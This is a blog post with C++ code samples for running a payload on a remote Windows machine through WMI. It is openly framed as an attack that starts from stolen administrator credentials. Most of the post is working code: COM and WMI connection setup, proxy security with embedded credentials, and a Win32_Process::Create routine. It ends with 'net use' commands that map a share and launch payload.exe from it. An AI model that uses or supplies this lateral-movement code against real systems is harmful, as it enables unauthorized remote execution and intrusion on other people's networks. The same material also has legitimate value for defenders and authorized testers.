---
layout: post
title: Launching a payload on remote machine using WMI
date: 2017-12-29
category: CodeSamples
---

Here's a sample on how to launch a custom executable/payload on a remote machine using WMI. Obviously, valid credentials have to be stolen first before you can connect to the remote machine. The user who is trying to access the remote machine, should be a member of the Local administrators group on the remote machine. 

Here are the basic steps:
* The first step is to initialize the COM infrastructure.

    {% highlight cpp %}
    //-- Initialize COM.
	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres))
	{
		cout << "\nFailed to initialize COM library. Error code = 0x"
			<< hex << hres << endl;
		return 1;
	}
	cout << "\nCOM initialised";
    
	//-- Set general COM security levels
	hres = CoInitializeSecurity(
		NULL,
		-1,                          // COM authentication
		NULL,                        // Authentication services
		NULL,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IDENTIFY,    // Default Impersonation  
		NULL,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		NULL                         // Reserved
		);
    {% endhighlight %}

2. Next, create an instance of the Wbem locator and connect to the "root\cimv2" WMI namespace of the remote machine. Since we were connecting to a remote machine, the namespace should be fully qualified : "\\\\<server>\\root\\cimv2"



	//-- Obtain the WMI locator to pointer
	hres = CoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, (LPVOID *)&pLoc);

	//-- Preparing the connection parameters
	wstrConnectPath.assign(L"\\\\");
	wstrConnectPath.append(wstrMachineName);
	wstrConnectPath.append(L"\\root\\cimv2");

	//-- Connect to the remote root\cimv2 namespace and obtain pointer pSvc to make IWbemServices calls.
	hres = pLoc->ConnectServer(
		_bstr_t(wstrConnectPath.c_str()),
		_bstr_t(wstrUserName.c_str()),		// User name
		_bstr_t(wstrPassword.c_str()),		// User password
		NULL,								// Locale             
		NULL,								// Security flags
		NULL,	//_bstr_t(wstrDomainAuth.c_str()),	// Authority        
		NULL,                              // Context object 
		&pSvc                              // IWbemServices proxy
		);

3. After you retrieve a pointer to an IWbemServices proxy, you must set the security on the proxy to access WMI on the remote machine through the proxy. This step is compulsary because IWbemServices proxy will only grants access to an out-of-process or remote object if the security properties are correct.

    // Ref: https://msdn.microsoft.com/en-us/library/aa393619(v=vs.85).aspx
	
	authIdent.PasswordLength = wcslen(wstrPassword.c_str());
	authIdent.Password = (USHORT*)wstrPassword.c_str();
	authIdent.UserLength = wcslen(wstrUserName.c_str());
	authIdent.User = (USHORT*)wstrUserName.c_str();
	authIdent.DomainLength = 0;   //<-- size of domain name
	authIdent.Domain = (USHORT*) NULL;   //<-- this should be domain name	
	authIdent.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
	userAcct = &authIdent;


	//-- Set security levels on the new WMI connection
	hres = CoSetProxyBlanket(
		pSvc,                           // Indicates the proxy to set
		RPC_C_AUTHN_DEFAULT,            // RPC_C_AUTHN_xxx
		RPC_C_AUTHZ_DEFAULT,            // RPC_C_AUTHZ_xxx
		COLE_DEFAULT_PRINCIPAL,         // Server principal name 
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL_xxx
		userAcct,                       // client identity  <--- ideally you have to create COAUTHIDENTITY  class 
		EOAC_NONE                       // proxy capabilities 
		);

4. If you have a pointer to the IWbemServices proxy - it means you have a successful connection to the WMI namespace on the remote machine. To drop the payload and launch the attack - you need to be able to create a process on the remote machine first. I've seperated this part into a function of its own, you pass in the IWbemServices proxy, and the process name and arguments as input. Refer to the function snippet below:

    /*-Refernce : https://msdn.microsoft.com/en-us/library/aa390421(v=vs.85).aspx -*/
    DWORD CreateProcessOnRemote(IWbemServices *pSvc, std::wstring wstrProcessName, std::wstring wstrProcessArgs)
    {
        HRESULT hres = 0;
        BSTR MethodName = SysAllocString(L"Create");
        BSTR ClassName = SysAllocString(L"Win32_Process");
        IWbemClassObject* pClass = NULL;
        IWbemClassObject* pInParamsDefinition = NULL;
        IWbemClassObject* pClassInstance = NULL;
        IWbemClassObject* pOutParams = NULL;
        std::wstring wstrCommandLine = wstrProcessName + L" " + wstrProcessArgs;
        VARIANT varCommand;
        VARIANT varReturnValue;

        hres = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);
        //-- if above call is success, we are able to enumerate Win32_Process class in root\cimv2 on the remote machine
        if (FAILED(hres))
        {
            cout << "\n pSvc->GetObject failed."
                << " Error code = 0x"
                << hex << hres << endl;
            goto cleanup;
        }

        hres = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);
        //-- if above call is success, we have a pointer to the Create method of Win32_Process class
        if (FAILED(hres))
        {
            cout << "\n pClass->GetMethod failed."
                << " Error code = 0x"
                << hex << hres << endl;
            goto cleanup;
        }


        hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);
        //-- Spawn instance of the Win32_Process::Create Parameters.
        if (FAILED(hres))
        {
            cout << "\n pInParamsDefinition->SpawnInstance failed."
                << " Error code = 0x"
                << hex << hres << endl;
            goto cleanup;
        }

        // Create the values for the in-parameters	
        varCommand.vt = VT_BSTR;
        varCommand.bstrVal = _bstr_t(wstrCommandLine.c_str());
        //-- you can also pass CurrentDirectory and ProcessStartupInformation (Win32_ProcessStartup)
        //-- See https://msdn.microsoft.com/en-us/library/aa389388(v=vs.85).aspx


        //-- Store the value for the in-parameters
        hres = pClassInstance->Put(L"CommandLine", 0, &varCommand, 0);
        if (FAILED(hres))
        {
            cout << "\n   pClassInstance->Put failed."
                << " Error code = 0x"
                << hex << hres << endl;
            goto cleanup;
        }

        cout << "\nThe command is:" << wstrCommandLine.c_str() << endl;

        //-- Execute Method	
        hres = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);
        //-- if this call is successfull, then we have executed the method on the remote machine
        if (FAILED(hres))
        {
            cout << "\n  pSvc->ExecMethod failed."
                << " Error code = 0x"
                << hex << hres << endl;
            goto cleanup;
        }

        hres = pOutParams->Get(_bstr_t(L"ReturnValue"), 0, &varReturnValue, NULL, 0);
        if (FAILED(hres))
        {
            cout << "\n   pOutParams->Get failed."
                << " Error code = 0x"
                << hex << hres << endl;
        }
        cout << "\n Process return value:" << varReturnValue.intVal; 

    cleanup:
        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);

        if (pClass != NULL)
        {
            pClass->Release();
        }

        if (pClassInstance != NULL)
        {
            pClassInstance->Release();
        }

        if (pInParamsDefinition != NULL)
        {
            pInParamsDefinition->Release();
        }

        if (pOutParams != NULL)
        {
            pOutParams->Release();
        }

        return hres;
    }

5. Now all you need is the actual command to launch the payload. The approach I've used in my sample is to map a network share, and then launch the payload from that share. This involves running the following commands in sequence:

    net use \\<servername>\<sharename> /user:<username> <password>
    \\<servername>\<sharename>\<payload.exe> <switches>
    net use \\<servername>\<sharename> /delete

6. Once the process is launched, you decide what the payload must do. This code simply cleans up and exits. 


For full source, refer: https://github.com/VimalShekar/Cpp/tree/master/src/WmiRemoteProcessLaunch